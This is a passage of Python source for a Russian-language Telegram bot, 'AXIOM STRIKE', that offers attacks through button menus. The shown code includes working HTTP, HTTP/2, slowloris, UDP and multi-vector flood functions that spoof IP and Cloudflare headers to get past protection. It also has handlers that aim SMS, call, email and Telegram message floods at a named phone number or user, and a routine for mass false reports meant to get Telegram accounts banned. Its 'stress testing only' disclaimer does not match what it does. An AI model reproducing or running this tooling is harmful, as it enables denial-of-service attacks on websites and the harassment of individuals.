            'Mozilla/5.0 (Linux; Android 13; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Xiaomi 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Xiaomi 12 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # === ANDROID ONEPLUS ===
            'Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; OnePlus 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; OnePlus 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # === ANDROID GOOGLE ===
            'Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            
            # === РОБОТЫ/БОТЫ ===
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)',
            'Mozilla/5.0 (compatible; SemrushBot/7.0; +http://www.semrush.com/bot.html)',
            'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)',
            'Mozilla/5.0 (compatible; DotBot/1.2; +http://www.opensiteexplorer.org/dotbot)',
        ]
        
        # Cloudflare обходные заголовки
        self.cf_headers = [
            {'CF-RAY': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA","MAD","PAR","MIL","MUC","VIE","ARN","CPH","OSL","HEL","DUB"])}'},
            {'CF-Connecting-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}'},
            {'CF-Visitor': '{"scheme":"https"}'},
            {'CF-Worker': 'true'},
            {'CF-Polish': 'true'},
            {'CF-Cache-Status': 'HIT'},
            {'CF-Edge-Cache': 'cache,platform=wordpress'},
            {'CF-Ray': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA"])}'},
            {'CF-RAY': f'{random.randint(1000000000,9999999999)}-{random.choice(["SYD","HND","ICN","SIN","HKG","NRT"])}'},
        ]
        
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}

    async def http_flood(self, url: str, threads: int, duration: int, progress_callback):
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}
        
        async def worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', 'https://vk.com', url]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'Pragma': 'no-cache',
                            'Upgrade-Insecure-Requests': '1',
                            'Sec-Fetch-Dest': 'document',
                            'Sec-Fetch-Mode': 'navigate',
                            'Sec-Fetch-Site': 'none',
                            'Sec-Fetch-User': '?1',
                            'X-Requested-With': 'XMLHttpRequest',
                            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                        }
                        # Добавляем Cloudflare-заголовки
                        if random.random() > 0.3:
                            cf_header = random.choice(self.cf_headers)
                            headers.update(cf_header)
                        
                        # Множественные пути для обхода
                        paths = [
                            f"/?rand={random.randint(100000, 999999)}",
                            f"/?v={random.randint(1000,9999)}",
                            f"/?p={random.randint(1,100)}",
                            f"/?page={random.randint(1,50)}",
                            f"/?id={random.randint(1000,9999)}",
                            f"/?token={hashlib.md5(str(random.randint(0,999999)).encode()).hexdigest()}",
                            f"/?ts={int(time.time())}",
                        ]
                        path = random.choice(paths)
                        
                        async with session.get(url + path, headers=headers, timeout=3) as resp:
                            self.stats['requests'] += 1
                            if resp.status < 500:  # Успешно если не 500+
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                    except:
                        self.stats['errors'] += 1
                    await asyncio.sleep(random.uniform(0.005, 0.03))
        
        tasks = [worker() for _ in range(min(threads, 10000))]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def http2_flood(self, url: str, threads: int, duration: int, progress_callback):
        """HTTP/2 обход Cloudflare"""
        self.stats = {'requests': 0, 'success': 0, 'errors': 0}
        
        async def worker():
            conn = aiohttp.TCPConnector(ssl=False, enable_cleanup_closed=True)
            async with aiohttp.ClientSession(connector=conn) as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            ':method': 'GET',
                            ':scheme': 'https' if url.startswith('https') else 'http',
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'cache-control': 'no-cache',
                            'pragma': 'no-cache',
                            'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="120"',
                            'sec-ch-ua-mobile': '?0',
                            'sec-ch-ua-platform': '"Windows"',
                        }
                        if random.random() > 0.5:
                            headers.update({'cf-ray': f'{random.randint(1000000000,9999999999)}-{random.choice(["LHR","AMS","FRA"])}'})
                        
                        async with session.get(url, headers=headers, timeout=3) as resp:
                            self.stats['requests'] += 1
                            if resp.status < 500:
                                self.stats['success'] += 1
                            else:
                                self.stats['errors'] += 1
                    except:
                        self.stats['errors'] += 1
                    await asyncio.sleep(random.uniform(0.005, 0.02))
        
        tasks = [worker() for _ in range(min(threads, 8000))]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def slowloris(self, url: str, duration: int, progress_callback):
        self.stats = {'connections': 0, 'active': 0}
        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        port = 443 if url.startswith('https') else 80
        
        async def worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                headers = [
                    f"GET / HTTP/1.1\r\n",
                    f"Host: {target}\r\n",
                    f"User-Agent: {random.choice(self.user_agents)}\r\n",
                    f"Connection: keep-alive\r\n",
                    f"Keep-Alive: timeout=999, max=1000\r\n",
                    f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
                    f"X-Real-IP: {random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}\r\n",
                    f"Cache-Control: no-cache\r\n",
                    f"\r\n"
                ]
                writer.write(''.join(headers).encode())
                await writer.drain()
                self.stats['connections'] += 1
                self.stats['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                self.stats['active'] -= 1
            except:
                pass
        
        tasks = [worker() for _ in range(500)]
        await asyncio.gather(*tasks, return_exceptions=True)
        return self.stats

    async def multi_vector(self, url: str, duration: int, progress_callback):
        """Комбинированная атака с обходом"""
        total_stats = {
            'http': {'requests': 0, 'success': 0, 'errors': 0},
            'http2': {'requests': 0, 'success': 0, 'errors': 0},
            'slowloris': {'connections': 0, 'active': 0},
            'udp': {'packets': 0, 'bytes': 0}
        }
        
        target = url.replace('https://', '').replace('http://', '').split('/')[0]
        ip = socket.gethostbyname(target) if target else '127.0.0.1'
        port = 443 if url.startswith('https') else 80
        
        async def http_worker():
            async with aiohttp.ClientSession() as session:
                end_time = time.time() + duration
                while time.time() < end_time:
                    try:
                        headers = {
                            'User-Agent': random.choice(self.user_agents),
                            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}',
                            'Referer': random.choice(['https://google.com', 'https://yandex.ru', url]),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Accept-Encoding': 'gzip, deflate, br',
                            'Connection': 'keep-alive',
                            'Cache-Control': 'no-cache',
                            'CF-Ray': f'{random.randint(1000000000,9999999999)}-LHR',
                        }
                        async with session.get(url, headers=headers, timeout=2) as resp:
                            total_stats['http']['requests'] += 1
                            if resp.status < 500:
                                total_stats['http']['success'] += 1
                            else:
                                total_stats['http']['errors'] += 1
                    except:
                        total_stats['http']['errors'] += 1
                    await asyncio.sleep(0.005)
        
        async def slowloris_worker():
            try:
                reader, writer = await asyncio.open_connection(target, port, ssl=url.startswith('https'))
                writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\nKeep-Alive: timeout=999\r\n\r\n".encode())
                await writer.drain()
                total_stats['slowloris']['connections'] += 1
                total_stats['slowloris']['active'] += 1
                await asyncio.sleep(duration)
                writer.close()
                await writer.wait_closed()
                total_stats['slowloris']['active'] -= 1
            except:
                pass
        
        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    data = random._urandom(random.randint(64, 1500))
                    sock.sendto(data, (ip, port))
                    total_stats['udp']['packets'] += 1
                    total_stats['udp']['bytes'] += len(data)
                except:
                    pass
        
        # Запускаем все типы атак
        http_tasks = [http_worker() for _ in range(200)]
        slow_tasks = [slowloris_worker() for _ in range(100)]
        
        # UDP в отдельном потоке
        udp_threads = [threading.Thread(target=udp_worker) for _ in range(30)]
        for t in udp_threads:
            t.start()
        
        await asyncio.gather(*http_tasks, *slow_tasks, return_exceptions=True)
        for t in udp_threads:
            t.join()
        
        return total_stats


# ===================== ГЛАВНЫЙ БОТ =====================
class AxiomStrikeBot:
    def __init__(self, token: str):
        self.bot = Bot(token=token)
        self.storage = MemoryStorage()
        self.dp = Dispatcher(storage=self.storage)
        self.sms_bomber = SMSBomber()
        self.call_bomber = CallBomber()
        self.email_bomber = EmailBomber()
        self.tg_bomber = TelegramBomber(token)
        self.ddos_engine = DDoSEngine()
        self.destroyer = TelegramAccountDestroyer()
        self._register_handlers()

    def _register_handlers(self):
        # Команды
        self.dp.message.register(self.cmd_start, CommandStart())
        self.dp.message.register(self.cmd_help, Command("help"))

        # Главное меню
        main_buttons = ["📱 БОМБЕР", "💣 DDOS АТАКА", "💀 СНОС АККАУНТА", "📊 СТАТИСТИКА", "⚙️ НАСТРОЙКИ"]
        self.dp.message.register(self.handle_main_menu, F.text.in_(main_buttons))

        # Бомбер меню
        bomber_buttons = ["💬 СМС БОМБЕР", "📞 ЗВОНКИ (ФЛУД)", "📧 EMAIL БОМБЕР", "📩 TELEGRAM БОМБЕР", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_bomber_menu, F.text.in_(bomber_buttons))

        # DDoS меню
        ddos_buttons = ["🌐 HTTP FLOOD", "🐌 SLOWLORIS", "📡 UDP FLOOD", "💀 MULTI-VECTOR", "🔙 НАЗАД"]
        self.dp.message.register(self.handle_ddos_menu, F.text.in_(ddos_buttons))

        # === СНОС АККАУНТА ===
        self.dp.message.register(self.handle_destroy_account, F.text == "💀 СНОС АККАУНТА")
        self.dp.message.register(self.process_destroy_username, BomberStates.waiting_for_destroy_username)
        self.dp.message.register(self.process_destroy_method, BomberStates.waiting_for_destroy_method)
        self.dp.message.register(self.process_destroy_count, BomberStates.waiting_for_destroy_count)

        # Обработчики бомбера
        self.dp.message.register(self.handle_sms_bomber, F.text == "💬 СМС БОМБЕР")
        self.dp.message.register(self.handle_call_bomber, F.text == "📞 ЗВОНКИ (ФЛУД)")
        self.dp.message.register(self.handle_email_bomber, F.text == "📧 EMAIL БОМБЕР")
        self.dp.message.register(self.handle_telegram_bomber, F.text == "📩 TELEGRAM БОМБЕР")

        # Обработчики DDoS
        self.dp.message.register(self.handle_http_flood, F.text == "🌐 HTTP FLOOD")
        self.dp.message.register(self.handle_slowloris, F.text == "🐌 SLOWLORIS")
        self.dp.message.register(self.handle_udp_flood, F.text == "📡 UDP FLOOD")
        self.dp.message.register(self.handle_multi_vector, F.text == "💀 MULTI-VECTOR")

        # Статистика и настройки
        self.dp.message.register(self.handle_stats, F.text == "📊 СТАТИСТИКА")
        self.dp.message.register(self.handle_settings, F.text == "⚙️ НАСТРОЙКИ")
        self.dp.message.register(self.handle_back, F.text == "🔙 НАЗАД")

        # FSM обработчики бомбера
        self.dp.message.register(self.process_sms_phone, BomberStates.waiting_for_phone)
        self.dp.message.register(self.process_sms_count, BomberStates.waiting_for_sms_count)
        self.dp.message.register(self.process_call_count, BomberStates.waiting_for_call_count)
        self.dp.message.register(self.process_email, BomberStates.waiting_for_email)
        self.dp.message.register(self.process_email_count, BomberStates.waiting_for_email_count)
        self.dp.message.register(self.process_telegram, BomberStates.waiting_for_telegram)
        self.dp.message.register(self.process_telegram_count, BomberStates.waiting_for_telegram_count)

        # FSM обработчики DDoS
        self.dp.message.register(self.process_ddos_url, DDoSStates.waiting_for_url)
        self.dp.message.register(self.process_ddos_threads, DDoSStates.waiting_for_threads)
        self.dp.message.register(self.process_ddos_duration, DDoSStates.waiting_for_duration)
        self.dp.message.register(self.process_ddos_ip, DDoSStates.waiting_for_ip)
        self.dp.message.register(self.process_ddos_ddos_duration, DDoSStates.waiting_for_ddos_duration)

        # Подписка
        self.dp.callback_query.register(self.handle_subscribe, F.data == "subscribed")

    # ========== КЛАВИАТУРЫ ==========
    def main_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="📱 БОМБЕР"), KeyboardButton(text="💣 DDOS АТАКА")],
                [KeyboardButton(text="💀 СНОС АККАУНТА"), KeyboardButton(text="📊 СТАТИСТИКА")],
                [KeyboardButton(text="⚙️ НАСТРОЙКИ")]
            ],
            resize_keyboard=True
        )

    def bomber_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="💬 СМС БОМБЕР"), KeyboardButton(text="📞 ЗВОНКИ (ФЛУД)")],
                [KeyboardButton(text="📧 EMAIL БОМБЕР"), KeyboardButton(text="📩 TELEGRAM БОМБЕР")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    def ddos_keyboard(self) -> ReplyKeyboardMarkup:
        return ReplyKeyboardMarkup(
            keyboard=[
                [KeyboardButton(text="🌐 HTTP FLOOD"), KeyboardButton(text="🐌 SLOWLORIS")],
                [KeyboardButton(text="📡 UDP FLOOD"), KeyboardButton(text="💀 MULTI-VECTOR")],
                [KeyboardButton(text="🔙 НАЗАД")]
            ],
            resize_keyboard=True
        )

    # ========== ОСНОВНЫЕ ОБРАБОТЧИКИ ==========
    async def cmd_start(self, message: types.Message, state: FSMContext):
        await state.clear()
        await message.answer(
            "🔥 **AXIOM STRIKE BOT** 🔥\n\n"
            "Мощный инструмент для стресс-тестирования.\n\n"
            "📱 **Бомбер:** СМС | Звонки | Email | Telegram\n"
            "💣 **DDoS:** HTTP | Slowloris | UDP | Multi-Vector\n"
            "💀 **Снос аккаунтов:** Массовые жалобы + Спам-флуд\n\n"
            "⚠️ Только для тестирования своих ресурсов!\n\n"
            "Подпишись на канал: @AXIOM_SOFT",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="✅ ПОДПИСАЛСЯ", callback_data="subscribed")]
                ]
            )
        )

    async def cmd_help(self, message: types.Message):
        await message.answer(
            "📚 **Помощь по AXIOM STRIKE**\n\n"
            "📱 **БОМБЕР** - массовая отправка сообщений\n"
            "💣 **DDOS** - стресс-тестирование сайтов\n"
            "💀 **СНОС АККАУНТА** - блокировка Telegram аккаунтов\n"
            "📊 **СТАТИСТИКА** - просмотр данных\n"
            "⚙️ **НАСТРОЙКИ** - конфигурация",
            reply_markup=self.main_keyboard()
        )

    async def handle_subscribe(self, callback: types.CallbackQuery):
        await callback.answer()
        await callback.message.edit_text(
            "✅ Подписка подтверждена!\n\n"
            "🔥 Добро пожаловать в AXIOM STRIKE"
        )
        await callback.message.answer("Выберите действие:", reply_markup=self.main_keyboard())

    async def handle_main_menu(self, message: types.Message, state: FSMContext):
        if message.text == "📱 БОМБЕР":
            await message.answer("📱 **МЕНЮ БОМБЕРА**\nВыберите тип атаки:", reply_markup=self.bomber_keyboard())
        elif message.text == "💣 DDOS АТАКА":
            await message.answer("💣 **МЕНЮ DDOS**\nВыберите метод атаки:", reply_markup=self.ddos_keyboard())
        elif message.text == "💀 СНОС АККАУНТА":
            await self.handle_destroy_account(message, state)
        elif message.text == "📊 СТАТИСТИКА":
            await self.handle_stats(message)
        elif message.text == "⚙️ НАСТРОЙКИ":
            await self.handle_settings(message)

    async def handle_back(self, message: types.Message):
        await message.answer("Главное меню:", reply_markup=self.main_keyboard())

    # ========== МЕНЮ БОМБЕРА ==========
    async def handle_bomber_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "💬 СМС БОМБЕР":
            await self.handle_sms_bomber(message, state)
        elif message.text == "📞 ЗВОНКИ (ФЛУД)":
            await self.handle_call_bomber(message, state)
        elif message.text == "📧 EMAIL БОМБЕР":
            await self.handle_email_bomber(message, state)
        elif message.text == "📩 TELEGRAM БОМБЕР":
            await self.handle_telegram_bomber(message, state)

    async def handle_ddos_menu(self, message: types.Message, state: FSMContext):
        if message.text == "🔙 НАЗАД":
            await message.answer("Главное меню:", reply_markup=self.main_keyboard())
            return
        if message.text == "🌐 HTTP FLOOD":
            await self.handle_http_flood(message, state)
        elif message.text == "🐌 SLOWLORIS":
            await self.handle_slowloris(message, state)
        elif message.text == "📡 UDP FLOOD":
            await self.handle_udp_flood(message, state)
        elif message.text == "💀 MULTI-VECTOR":
            await self.handle_multi_vector(message, state)

    # ========== СНОС АККАУНТА ==========
    async def handle_destroy_account(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_destroy_username)
        await message.answer(
            "💀 **СНОС TELEGRAM АККАУНТА**\n\n"
            "Введите @username для сноса:\n"
            "📝 Пример: @username123\n\n"
            "⚠️ 50-100 жалоб гарантируют блокировку!"
        )

    async def process_destroy_username(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_destroy_method)
        await message.answer(
            "📊 **Выберите метод сноса:**\n\n"
            "1️⃣ **📝 Массовые жалобы** (50-100 жалоб)\n"
            "2️⃣ **💬 Спам флуд** (50 сообщений)\n"
            "3️⃣ **💀 Все методы** (жалобы + спам)\n\n"
            "Введите номер метода (1, 2 или 3):"
        )

    async def process_destroy_method(self, message: types.Message, state: FSMContext):
        method = message.text.strip()
        if method not in ['1', '2', '3']:
            await message.answer("❌ Введите 1, 2 или 3!")
            return

        method_map = {'1': 'reports', '2': 'spam', '3': 'all'}
        await state.update_data(method=method_map[method])
        await state.set_state(BomberStates.waiting_for_destroy_count)
        await message.answer("🔢 Введите количество (рекомендуется 50-100):")

    async def process_destroy_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 10 or count > 200:
                await message.answer("❌ Введите число от 10 до 200!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        method = data.get('method')
        await state.clear()

        status_msg = await message.answer(
            f"💀 **Запуск сноса аккаунта {username}**\n"
            f"📊 Метод: {method}\n"
            f"⏳ Начинаем..."
        )

        async def update_progress(current, total):
            if current % 5 == 0 or current == total:
                await status_msg.edit_text(
                    f"💀 **Снос аккаунта {username}**\n"
                    f"📊 Прогресс: {current}/{total}\n"
                    f"⏳ Идёт процесс..."
                )

        if method == 'reports':
            results = await self.destroyer.mass_report(username, count, update_progress)
        elif method == 'spam':
            results = await self.destroyer.spam_flood(username, count, update_progress)
        else:
            results = await self.destroyer.destroy_account(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"💀 **Снос аккаунта {username} завершён!**\n\n"
            f"📊 Отправлено: {len(results)}\n"
            f"✅ Успешно: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"⏱ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
            f"🔥 Аккаунт будет заблокирован в ближайшее время!",
            reply_markup=self.main_keyboard()
        )

    # ========== ОБРАБОТЧИКИ БОМБЕРА ==========
    async def handle_sms_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📱 **СМС БОМБЕР**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_sms_phone(self, message: types.Message, state: FSMContext):
        phone = message.text.strip()
        if not re.match(r'^\+?[0-9]{10,15}$', phone):
            await message.answer("❌ Введите корректный номер!")
            return
        await state.update_data(phone=phone)
        await state.set_state(BomberStates.waiting_for_sms_count)
        await message.answer(
            "📊 Введите количество сообщений (1-100):"
        )

    async def process_sms_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 100:
                await message.answer("❌ Введите число от 1 до 100!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск СМС бомбера...\n0/{count}")

        async def update_progress(progress, current, total):
            if current % 10 == 0 or current == total:
                await status_msg.edit_text(f"⏳ Отправка СМС...\n{current}/{total} ({int(progress)}%)")

        results = await self.sms_bomber.send_sms(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')
        errors = len(results) - success

        await status_msg.edit_text(
            f"✅ **СМС бомбер завершён!**\n\n"
            f"📱 Номер: {phone}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {errors}\n"
            f"📈 Всего попыток: {len(results)}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_call_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_phone)
        await message.answer(
            "📞 **ЗВОНКИ (ФЛУД)**\n\n"
            "Введите номер телефона:\n"
            "📝 Пример: +79001234567"
        )

    async def process_call_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 20:
                await message.answer("❌ Введите число от 1 до 20!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        phone = data.get('phone')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск звонков...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Совершение звонков...\n{current}/{total}")

        results = await self.call_bomber.make_calls(phone, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'success')

        await status_msg.edit_text(
            f"✅ **Звонки завершены!**\n\n"
            f"📞 Номер: {phone}\n"
            f"📊 Совершено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_email_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_email)
        await message.answer(
            "📧 **EMAIL БОМБЕР**\n\n"
            "Введите email адрес:\n"
            "📝 Пример: example@gmail.com"
        )

    async def process_email(self, message: types.Message, state: FSMContext):
        email = message.text.strip()
        if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
            await message.answer("❌ Введите корректный email!")
            return
        await state.update_data(email=email)
        await state.set_state(BomberStates.waiting_for_email_count)
        await message.answer("📊 Введите количество писем (1-50):")

    async def process_email_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 50:
                await message.answer("❌ Введите число от 1 до 50!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        email = data.get('email')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Email бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка писем...\n{current}/{total}")

        results = await self.email_bomber.send_emails(email, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Email бомбер завершён!**\n\n"
            f"📧 Email: {email}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    async def handle_telegram_bomber(self, message: types.Message, state: FSMContext):
        await state.set_state(BomberStates.waiting_for_telegram)
        await message.answer(
            "📩 **TELEGRAM БОМБЕР**\n\n"
            "Введите @username:\n"
            "📝 Пример: @username123"
        )

    async def process_telegram(self, message: types.Message, state: FSMContext):
        username = message.text.strip()
        if not username.startswith('@'):
            username = '@' + username
        await state.update_data(username=username)
        await state.set_state(BomberStates.waiting_for_telegram_count)
        await message.answer("📊 Введите количество сообщений (1-30):")

    async def process_telegram_count(self, message: types.Message, state: FSMContext):
        try:
            count = int(message.text.strip())
            if count < 1 or count > 30:
                await message.answer("❌ Введите число от 1 до 30!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        username = data.get('username')
        await state.clear()

        status_msg = await message.answer(f"⏳ Запуск Telegram бомбера...\n0/{count}")

        async def update_progress(current, total):
            await status_msg.edit_text(f"⏳ Отправка сообщений...\n{current}/{total}")

        results = await self.tg_bomber.send_messages(username, count, update_progress)

        success = sum(1 for r in results if r['status'] == 'sent')

        await status_msg.edit_text(
            f"✅ **Telegram бомбер завершён!**\n\n"
            f"📩 Пользователь: {username}\n"
            f"📊 Отправлено: {success}\n"
            f"❌ Ошибок: {len(results) - success}\n"
            f"🕐 Время: {datetime.now().strftime('%H:%M:%S')}",
            reply_markup=self.bomber_keyboard()
        )

    # ========== ОБРАБОТЧИКИ DDOS ==========
    async def handle_http_flood(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
            "🌐 **HTTP FLOOD**\n\n"
            "Введите URL цели:\n"
            "📝 Пример: https://example.com"
        )

    async def process_ddos_url(self, message: types.Message, state: FSMContext):
        url = message.text.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        await state.update_data(url=url)
        await state.set_state(DDoSStates.waiting_for_threads)
        await message.answer(
            "⚡ Введите количество потоков (100-5000):"
        )

    async def process_ddos_threads(self, message: types.Message, state: FSMContext):
        try:
            threads = int(message.text.strip())
            if threads < 100 or threads > 5000:
                await message.answer("❌ Введите число от 100 до 5000!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        await state.update_data(threads=threads)
        await state.set_state(DDoSStates.waiting_for_duration)
        await message.answer(
            "⏱ Введите длительность в секундах (30-300):"
        )

    async def process_ddos_duration(self, message: types.Message, state: FSMContext):
        try:
            duration = int(message.text.strip())
            if duration < 30 or duration > 300:
                await message.answer("❌ Введите число от 30 до 300!")
                return
        except:
            await message.answer("❌ Введите число!")
            return

        data = await state.get_data()
        url = data.get('url')
        threads = data.get('threads', 500)
        await state.clear()

        status_msg = await message.answer(
            f"💣 **HTTP FLOOD запущена!**\n"
            f"🌐 URL: {url}\n"
            f"⚡ Потоков: {threads}\n"
            f"⏱ Длительность: {duration}с\n"
            f"⏳ Идёт атака..."
        )

        stats = await self.ddos_engine.http_flood(url, threads, duration, None)

        await status_msg.edit_text(
            f"💣 **HTTP FLOOD завершена!**\n\n"
            f"🌐 URL: {url}\n"
            f"📊 Запросов: {stats['requests']}\n"
            f"✅ Успешно: {stats['success']}\n"
            f"❌ Ошибок: {stats['errors']}\n"
            f"📈 RPS: {stats['requests'] / duration:.1f}\n"
            f"⏱ Длительность: {duration}с",
            reply_markup=self.ddos_keyboard()
        )

    async def handle_slowloris(self, message: types.Message, state: FSMContext):
        await state.set_state(DDoSStates.waiting_for_url)
        await message.answer(
